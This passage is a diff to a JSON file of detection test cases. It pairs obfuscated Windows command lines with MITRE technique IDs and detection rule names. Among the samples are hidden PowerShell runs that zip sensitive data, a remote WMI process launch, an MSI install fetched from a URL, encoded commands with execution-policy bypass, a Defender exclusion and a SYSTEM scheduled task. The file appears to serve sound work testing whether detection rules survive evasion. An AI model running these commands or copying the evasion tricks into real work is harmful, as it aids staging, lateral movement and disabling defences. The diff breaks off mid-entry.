@@ -240,6 +240,38 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1074.001_001",
+    "target_commandline": "powershell.exe /\"NoProfile\" /\"WindowStyle\" Hidden -c \"Compress-Archive -Path C:\\SensitiveData\\* -DestinationPath C:\\Users\\Public\\Documents\\archive.zip\"",
+    "target_rule": "proc_creation_win_powershell_zip_compress",
+    "technique_id": "t1074.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1074.001_002",
+    "target_commandline": "powershell.exe /\"NoProfile\" -\"WindowStyle\" Hidden -\"Command\" \"Compress-Archive -Path C:\\SensitiveData\\* -DestinationPath C:\\Users\\Public\\Documents\\archive.zip\"",
+    "target_rule": "proc_creation_win_powershell_zip_compress",
+    "technique_id": "t1074.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1074.001_003",
+    "target_commandline": "powershell.exe /\"NoProfile\" -WInDOwStYLe Hidden -CoMmAnd \"Compress-Archive -Path C:\\SensitiveData\\* -DestinationPath C:\\Users\\Public\\Documents\\archive.zip\"",
+    "target_rule": "proc_creation_win_powershell_zip_compress",
+    "technique_id": "t1074.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1074.001_004",
+    "target_commandline": "powershell.exe -nOpRoFile /\"WindowStyle\" Hidden -coMMAnd \"Compress-Archive -Path C:\\SensitiveData\\* -DestinationPath C:\\Users\\Public\\Documents\\archive.zip\"",
+    "target_rule": "proc_creation_win_powershell_zip_compress",
+    "technique_id": "t1074.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1113_001",
     "target_commandline": "cmd.exe /c \"psr.exe /^s^t^a^r^t /output c:\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12\"",
     "target_rule": "proc_creation_win_psr_capture_screenshots",
@@ -468,6 +500,22 @@
     "target_commandline": "cmd.exe /c \"f^o^r /L %i in (1,1,254) do p^i^n^g -n 1 192.168.1.%i\"",
     "target_rule": "proc_creation_win_susp_network_scan_loop",
     "technique_id": "t1018",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1021.003_001",
+    "target_commandline": "powershell.exe -nop -\"WindowStyle\" Hidden -c \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\\\127.0.0.2\\ADMIN$\\output.txt' -ComputerName 10.0.0.5\"",
+    "target_rule": "proc_creation_win_hktl_impacket_lateral_movement",
+    "technique_id": "t1021.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1021.003_002",
+    "target_commandline": "powershell.exe /\"NoProfile\" -WInDowSTyle Hidden /\"Command\" \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\\\127.0.0.2\\ADMIN$\\output.txt' -ComputerName 10.0.0.5\"",
+    "target_rule": "proc_creation_win_hktl_impacket_lateral_movement",
+    "technique_id": "t1021.003",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
   },
@@ -1584,6 +1632,54 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1027.010_008",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -COMmanD \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_009",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -c \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_010",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_011",
+    "target_commandline": "powershell.exe -wiNDowStyLe Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_012",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_013",
+    "target_commandline": "powershell.exe -WiNDOwSTYlE Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1027.010_014",
     "target_commandline": "powershell.exe /\"w\" hidden -c \"$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('https://example.com/payload.msi', '')\"",
     "target_rule": "proc_creation_win_powershell_comobject_msi",
@@ -1744,6 +1840,110 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1046_016",
+    "target_commandline": "powershell.exe -\"NoProfile\" -NonInteractive -WinDOwsTYle Hidden -ep Bypass /\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_017",
+    "target_commandline": "powershell.exe -nop /\"NonInteractive\" -\"WindowStyle\" Hidden /\"ExecutionPolicy\" Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_018",
+    "target_commandline": "powershell.exe -\"NoProfile\" /\"NonInteractive\" -\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass -\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_019",
+    "target_commandline": "powershell.exe -nop -NoNiNTeRActIVe -\"WindowStyle\" Hidden -EXECUtionpOLIcY Bypass -\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_020",
+    "target_commandline": "powershell.exe -\"NoProfile\" -nOniNteRacTivE -\"WindowStyle\" Hidden -EXECuTIONpOlIcy Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_021",
+    "target_commandline": "powershell.exe -nop -\"NonInteractive\" -\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass /\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_022",
+    "target_commandline": "powershell.exe /\"NoProfile\" /\"NonInteractive\" -WINDOWsTYLE Hidden /\"ExecutionPolicy\" Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_023",
+    "target_commandline": "powershell.exe -noProFiLe -exEcUtiOnpOLicy Bypass -WInDowStyLe Hidden /\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_024",
+    "target_commandline": "powershell.exe -nOPRofiLe -ExeCuTionpOlicy Bypass -winDoWSTYle Hidden -\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_025",
+    "target_commandline": "powershell.exe -NOpRoFIle /\"ExecutionPolicy\" Bypass /\"WindowStyle\" Hidden /\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_026",
+    "target_commandline": "powershell.exe -NOproFile -EXEcuTiOnpOLiCY Bypass -\"WindowStyle\" Hidden -EnCOdEdcomMaNd UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_027",
+    "target_commandline": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_028",
+    "target_commandline": "powershell.exe -ep Bypass /\"NoProfile\" -wINdoWStyLE Hidden -enCODEDCOMmaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1046_029",
     "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass /\"NoProfile\" -ws Hidden -\"EncodedCommand\" <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
@@ -1760,8 +1960,24 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1046_031",
+    "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass -nop -WiNdoWsTYLe Hidden -EncOdedcommanD <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1046_032",
     "target_commandline": "powershell.exe -EXECUTIonPOliCY Bypass -NOPrOFiLe -ws Hidden -enCOdEDcOmmaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_033",
+    "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass -noPRoFile /\"WindowStyle\" Hidden -enc <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -1776,9 +1992,41 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1046_035",
+    "target_commandline": "powershell.exe -\"ExecutionPolicy\" Bypass -NoProfILe -windOWstYLe Hidden -EncODEdCOMmANd <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1046_036",
     "target_commandline": "powershell.exe -ep Bypass -nop -ws Hidden -eNcoDEDcommaND <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_037",
+    "target_commandline": "powershell.exe -exECUtIOnPOlicY Bypass -nop /\"WindowStyle\" Hidden -\"EncodedCommand\" <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_038",
+    "target_commandline": "powershell.exe -nop -\"WindowStyle\" Hidden -c \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\\\127.0.0.2\\ADMIN$\\output.txt' -ComputerName 10.0.0.5\"",
+    "target_rule": "proc_creation_win_hktl_impacket_lateral_movement",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_039",
+    "target_commandline": "powershell.exe /\"NoProfile\" -WInDowSTyle Hidden /\"Command\" \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\\\127.0.0.2\\ADMIN$\\output.txt' -ComputerName 10.0.0.5\"",
+    "target_rule": "proc_creation_win_hktl_impacket_lateral_movement",
     "technique_id": "t1046",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
@@ -1907,6 +2155,78 @@
     "test_id": "t1046_055",
     "target_commandline": "powershell.exe /\"Command\" \"Invoke-CimMethod -Namespace 'root\\Microsoft\\Windows\\Defender' -ClassName MSFT_MpPreference -MethodName Add -Arguments @{ExclusionPath='C:\\Malware'}\"",
     "target_rule": "proc_creation_win_wmic_namespace_defender",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_056",
+    "target_commandline": "powershell.exe -nop -\"WindowStyle\" Hidden -c \"[wmiclass]'Win32_Process'.Create('calc.exe')\"",
+    "target_rule": "proc_creation_win_wmic_process_creation",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_057",
+    "target_commandline": "powershell.exe -\"NoProfile\" -WINDowStYLE Hidden -COMMAnD \"[wmiclass]'Win32_Process'.Create('calc.exe')\"",
+    "target_rule": "proc_creation_win_wmic_process_creation",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_058",
+    "target_commandline": "powershell.exe /\"NoProfile\" -wiNDoWStyle Hidden -coMmand \"[wmiclass]'Win32_Process'.Create('calc.exe')\"",
+    "target_rule": "proc_creation_win_wmic_process_creation",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_059",
+    "target_commandline": "powershell.exe /\"NoProfile\" -WinDOwsTYle Hidden -comMAnD \"[wmiclass]'Win32_Process'.Create('calc.exe')\"",
+    "target_rule": "proc_creation_win_wmic_process_creation",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_060",
+    "target_commandline": "powershell.exe -nop -\"WindowStyle\" Hidden -\"Command\" \"[wmiclass]'Win32_Process'.Create('calc.exe')\"",
+    "target_rule": "proc_creation_win_wmic_process_creation",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_061",
+    "target_commandline": "powershell.exe /\"NoProfile\" -wINDOwSTYle Hidden /\"Command\" \"Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model\"",
+    "target_rule": "proc_creation_win_wmic_recon_computersystem",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_062",
+    "target_commandline": "powershell.exe -nop -wiNdOwsTyLe Hidden /\"Command\" \"Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model\"",
+    "target_rule": "proc_creation_win_wmic_recon_computersystem",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_063",
+    "target_commandline": "powershell.exe -nop -\"WindowStyle\" Hidden -c \"Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model\"",
+    "target_rule": "proc_creation_win_wmic_recon_computersystem",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_064",
+    "target_commandline": "powershell.exe /\"NoProfile\" /\"WindowStyle\" Hidden -COMManD \"Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model\"",
+    "target_rule": "proc_creation_win_wmic_recon_computersystem",
     "technique_id": "t1046",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
@@ -2728,6 +3048,110 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1047_014",
+    "target_commandline": "powershell.exe -\"NoProfile\" -NonInteractive -WinDOwsTYle Hidden -ep Bypass /\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_015",
+    "target_commandline": "powershell.exe -nop /\"NonInteractive\" -\"WindowStyle\" Hidden /\"ExecutionPolicy\" Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_016",
+    "target_commandline": "powershell.exe -\"NoProfile\" /\"NonInteractive\" -\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass -\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_017",
+    "target_commandline": "powershell.exe -nop -NoNiNTeRActIVe -\"WindowStyle\" Hidden -EXECUtionpOLIcY Bypass -\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_018",
+    "target_commandline": "powershell.exe -\"NoProfile\" -nOniNteRacTivE -\"WindowStyle\" Hidden -EXECuTIONpOlIcy Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_019",
+    "target_commandline": "powershell.exe -nop -\"NonInteractive\" -\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass /\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_020",
+    "target_commandline": "powershell.exe /\"NoProfile\" /\"NonInteractive\" -WINDOWsTYLE Hidden /\"ExecutionPolicy\" Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_021",
+    "target_commandline": "powershell.exe -noProFiLe -exEcUtiOnpOLicy Bypass -WInDowStyLe Hidden /\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_022",
+    "target_commandline": "powershell.exe -nOPRofiLe -ExeCuTionpOlicy Bypass -winDoWSTYle Hidden -\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_023",
+    "target_commandline": "powershell.exe -NOpRoFIle /\"ExecutionPolicy\" Bypass /\"WindowStyle\" Hidden /\"EncodedCommand\" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_024",
+    "target_commandline": "powershell.exe -NOproFile -EXEcuTiOnpOLiCY Bypass -\"WindowStyle\" Hidden -EnCOdEdcomMaNd UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_025",
+    "target_commandline": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_026",
+    "target_commandline": "powershell.exe -ep Bypass /\"NoProfile\" -wINdoWStyLE Hidden -enCODEDCOMmaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1047_027",
     "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass /\"NoProfile\" -ws Hidden -\"EncodedCommand\" <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
@@ -2744,8 +3168,24 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1047_029",
+    "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass -nop -WiNdoWsTYLe Hidden -EncOdedcommanD <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1047_030",
     "target_commandline": "powershell.exe -EXECUTIonPOliCY Bypass -NOPrOFiLe -ws Hidden -enCOdEDcOmmaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_031",
+    "target_commandline": "powershell.exe /\"ExecutionPolicy\" Bypass -noPRoFile /\"WindowStyle\" Hidden -enc <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -2760,8 +3200,24 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1047_033",
+    "target_commandline": "powershell.exe -\"ExecutionPolicy\" Bypass -NoProfILe -windOWstYLe Hidden -EncODEdCOMmANd <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1047_034",
     "target_commandline": "powershell.exe -ep Bypass -nop -ws Hidden -eNcoDEDcommaND <BASE64_PAYLOAD>",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_035",
+    "target_commandline": "powershell.exe -exECUtIOnPOlicY Bypass -nop /\"WindowStyle\" Hidden -\"EncodedCommand\" <BASE64_PAYLOAD>",
     "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -2771,6 +3227,38 @@
     "test_id": "t1047_036",
     "target_commandline": "cmd.exe /c \"cd C:\\Users\\Public\\..\\Admin\\AppData\\Local && schtasks /Create /TN \"UpdateTask\" /TR \"payload.exe\" /SC ONSTART /RU SYSTEM\"",
     "target_rule": "proc_creation_win_schtasks_appdata_local_system",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_037",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -\"WindowStyle\" Hidden -Ep Bypass -\"noni\" /\"Command\" \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_038",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WiNdoWstYle Hidden -EP Bypass -\"noni\" -COmmand \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_039",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -winDOWstYlE Hidden -ExecutionPolicy Bypass /\"noni\" -c \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_040",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WinDOwStYLe Hidden -\"ep\" Bypass -noni -c \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
     "technique_id": "t1047",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
@@ -2810,6 +3298,22 @@
   {
     "test_id": "t1047_045",
     "target_commandline": "powershell.exe -\"w\" hidden -nOprOfiLe",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_046",
+    "target_commandline": "powershell.exe /\"windowstyle\" hidden",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_047",
+    "target_commandline": "powershell.exe -\"windowstyle\" hidden",
     "target_rule": "proc_creation_win_schtasks_powershell_persistence",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -3544,6 +4048,110 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1059.001_064",
+    "target_commandline": "powershell.exe -\"NoProfile\" -NonInteractive -WinDOwsTYle Hidden -ep Bypass /\"Command\" \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_065",
+    "target_commandline": "powershell.exe -nop /\"NonInteractive\" -\"WindowStyle\" Hidden /\"ExecutionPolicy\" Bypass -c \"Write-Host 'Test'\"",
+    "target_rule": "proc_creation_win_hktl_crackmapexec_execution_patterns",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_066",
